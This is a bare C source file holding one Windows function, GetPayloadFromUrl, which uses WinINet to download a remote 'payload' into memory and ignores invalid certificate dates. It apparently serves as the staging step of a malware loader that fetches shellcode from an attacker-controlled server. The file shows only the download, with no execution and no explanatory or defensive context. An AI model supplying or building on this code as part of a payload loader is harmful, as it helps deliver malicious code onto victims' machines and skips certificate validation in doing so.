#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <wininet.h>

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
        hInternetFile = NULL;

    DWORD		dwBytesRead = NULL;

    SIZE_T		sSize = NULL;
    PBYTE		pBytes = NULL,
        pTmpBytes = NULL;



    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }


    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf("\n[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }


    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {

        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }



    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (pTmpBytes)
        LocalFree(pTmpBytes);
    return bSTATE;
}